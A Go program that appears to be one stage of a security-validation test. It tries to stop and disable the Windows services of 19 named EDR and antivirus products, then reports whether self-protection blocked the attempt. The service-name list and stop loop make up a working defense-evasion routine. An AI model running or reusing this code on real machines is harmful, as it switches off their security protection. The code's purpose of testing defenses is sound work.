//go:build windows
// +build windows

/*
Stage 3: EDR Service Disruption
Technique: T1489 - Service Stop
MITRE ATT&CK Tactic: Impact

This stage attempts to stop and disable EDR/AV services.
*/

package main

import (
	"fmt"
	"strings"
	"time"

	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

const (
	STAGE_ID     = 3
	TECHNIQUE_ID = "T1489"
	STAGE_NAME   = "EDR Service Disruption"
)

// EDRServiceMapping maps EDR products to their Windows service names
var EDRServiceMapping = map[string][]string{
	"Windows Defender": {"WinDefend", "Sense", "WdNisSvc"},
	"CrowdStrike Falcon": {"CSAgent", "CSFalconService"},
	"SentinelOne": {"SentinelAgent", "SentinelStaticEngine"},
	"Carbon Black": {"CarbonBlack", "RepMgr"},
	"Cylance": {"CylanceSvc"},
	"Symantec Endpoint Protection": {"SepMasterService", "SepScanService"},
	"McAfee": {"McAfeeFramework", "McShield", "mfemms"},
	"Trend Micro": {"TMBMServer", "ntrtscan"},
	"Palo Alto Cortex XDR": {"CyveraService"},
	"FireEye Endpoint Agent": {"xagt"},
	"Sophos": {"Sophos Agent", "SAVService"},
	"ESET": {"ekrn"},
	"Kaspersky": {"AVP"},
	"Tanium": {"TaniumClient"},
	"Cisco Secure Endpoint": {"sfc"},
	"FortiClient": {"FortiClient"},
	"Bitdefender": {"EPINTEGRATIONSERVICE", "EPSecurityService"},
	"Webroot SecureAnywhere": {"WRSVC"},
	"Microsoft Defender for Endpoint": {"Sense"},
}

func main() {
	Endpoint.Say("=================================================================")
	Endpoint.Say("Stage %d: %s", STAGE_ID, STAGE_NAME)
	Endpoint.Say("Technique: %s", TECHNIQUE_ID)
	Endpoint.Say("=================================================================")
	Endpoint.Say("")

	// Attach to parent test logger
	AttachLogger("640e6458-5b6b-4153-87b4-8327599829a8", STAGE_NAME)

	// Connect to Service Control Manager
	m, err := mgr.Connect()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[!] Failed to connect to Service Control Manager: %v", err))
		LogMessage("ERROR", "Stage3", fmt.Sprintf("SCM connection failed: %v", err))
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	defer m.Disconnect()

	Endpoint.Say("[+] Connected to Service Control Manager")
	Endpoint.Say("[*] Attempting service disruption...")
	Endpoint.Say("")

	blockedCount := 0
	successCount := 0
	totalAttempts := 0

	// Attempt to disrupt common EDR services
	for product, services := range EDRServiceMapping {
		for _, serviceName := range services {
			totalAttempts++
			result := AttemptServiceDisruption(m, serviceName, product)

			if result == "blocked" {
				blockedCount++
			} else if result == "success" {
				successCount++
			}
		}
	}

	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("Stage 3 Results")
	Endpoint.Say("=================================================================")
	Endpoint.Say(fmt.Sprintf("Total attempts:     %d", totalAttempts))
	Endpoint.Say(fmt.Sprintf("Blocked operations: %d", blockedCount))
	Endpoint.Say(fmt.Sprintf("Successful operations: %d", successCount))
	Endpoint.Say("")

	LogMessage("INFO", "Stage3", fmt.Sprintf("Service disruption finished - %d blocked, %d succeeded",
		blockedCount, successCount))

	// Determine exit code
	if blockedCount > 0 {
		// At least some operations were blocked - protection active
		Endpoint.Say("[+] EDR self-protection mechanisms are active")
		Endpoint.Stop(Endpoint.ExecutionPrevented) // 126 = blocked
	} else if successCount > 0 {
		// Services were successfully disrupted
		Endpoint.Say("[!] EDR services were successfully disrupted")
		Endpoint.Stop(Endpoint.Unprotected) // 101 = vulnerable
	} else {
		// No services found or accessed
		Endpoint.Say("[*] No EDR services found or accessible")
		Endpoint.Stop(Endpoint.ExecutionPrevented) // 126 = inconclusive, default to protected
	}
}

func AttemptServiceDisruption(m *mgr.Mgr, serviceName, product string) string {
	s, err := m.OpenService(serviceName)
	if err != nil {
		// Service doesn't exist - not an error, just not installed
		if strings.Contains(err.Error(), "does not exist") {
			return "not_found"
		}

		// Access denied - protection active!
		if strings.Contains(err.Error(), "Access is denied") {
			Endpoint.Say(fmt.Sprintf("  [!] %s (%s): Access denied (protected)", serviceName, product))
			LogMessage("WARNING", "Stage3", fmt.Sprintf("Service access blocked: %s (%s)", serviceName, product))
			return "blocked"
		}

		return "error"
	}
	defer s.Close()

	// Query current state
	status, err := s.Query()
	if err != nil {
		return "error"
	}

	// Skip if already stopped
	if status.State == svc.Stopped {
		return "already_stopped"
	}

	// Attempt to stop service
	Endpoint.Say(fmt.Sprintf("  [*] Attempting to stop %s (%s)...", serviceName, product))

	_, err = s.Control(svc.Stop)
	if err != nil {
		if strings.Contains(err.Error(), "Access is denied") {
			Endpoint.Say(fmt.Sprintf("      [!] Stop operation blocked (protected)"))
			LogMessage("WARNING", "Stage3", fmt.Sprintf("Service stop blocked: %s (%s)", serviceName, product))
			return "blocked"
		}
		Endpoint.Say(fmt.Sprintf("      [!] Failed: %v", err))
		return "error"
	}

	// Wait for service to stop
	timeout := time.Now().Add(10 * time.Second)
	for {
		status, err := s.Query()
		if err != nil {
			break
		}
		if status.State == svc.Stopped {
			Endpoint.Say(fmt.Sprintf("      [+] Successfully stopped"))
			LogMessage("INFO", "Stage3", fmt.Sprintf("EDR service stopped: %s (%s)", serviceName, product))
			return "success"
		}
		if time.Now().After(timeout) {
			Endpoint.Say(fmt.Sprintf("      [!] Timeout"))
			break
		}
		time.Sleep(300 * time.Millisecond)
	}

	return "timeout"
}
